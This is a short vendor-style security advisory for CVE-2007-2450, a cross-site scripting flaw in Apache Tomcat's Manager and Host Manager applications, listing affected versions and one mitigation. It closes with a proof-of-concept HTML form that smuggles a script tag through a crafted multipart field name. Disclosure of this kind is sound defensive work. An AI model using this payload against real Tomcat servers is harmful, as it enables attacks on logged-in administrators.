CVE-2007-2450: Apache Tomcat XSS vulnerabilities in Manager

Severity: low (cross-site scripting)

Vendor:
The Apache Software Foundation

Versions Affected:
Tomcat 4.0.0 to 4.0.6
Tomcat 4.1.0 to 4.1.36
Tomcat 5.0.0 to 5.0.30
Tomcat 5.5.0 to 5.5.24
Tomcat 6.0.0 to 6.0.13

Description:
The Manager and Host Manager web applications do not escape some user
provided data before including it in the output. This enables a XSS
attack. The user must be logged in to the Manager or Host Manager web
application.

Mitigation:
1. Log out of the Manager or Host Manager application (close the
browser) once tasks requiring use of the manager have been completed.

Example:
    <form action="http://example.com:8080/manager/html/upload"
method="post" enctype="multipart/form-data">
    <INPUT TYPE="hidden"
NAME='deployWar";filename="<script>alert()</script>"
    Content-Type: image/gif' VALUE="abc">
    <input type="submit">
    </form>
